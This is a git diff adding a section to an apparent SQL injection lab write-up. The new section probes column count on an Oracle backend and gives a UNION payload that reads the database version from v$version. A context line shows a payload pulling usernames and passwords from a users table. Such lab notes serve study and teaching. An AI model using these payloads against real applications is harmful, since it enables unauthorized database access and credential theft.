@@ -63,3 +63,14 @@ SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,username||':'|
 
 > Payload : `' UNION SELECT NULL,username||':'||password FROM users--`
 
+## SQL injection attack, querying the database type and version on Oracle
+
+```sql
+SELECT * FROM products WHERE category = 'Gifts'
+SELECT * FROM products WHERE category = 'Gifts' --'
+SELECT * FROM products WHERE category = 'Gifts' ORDER BY 3--'
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT 'a','a' FROM dual --'
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, banner FROM v$version --'
+```
+
+> Payload : `' UNION SELECT NULL, banner FROM v$version --`
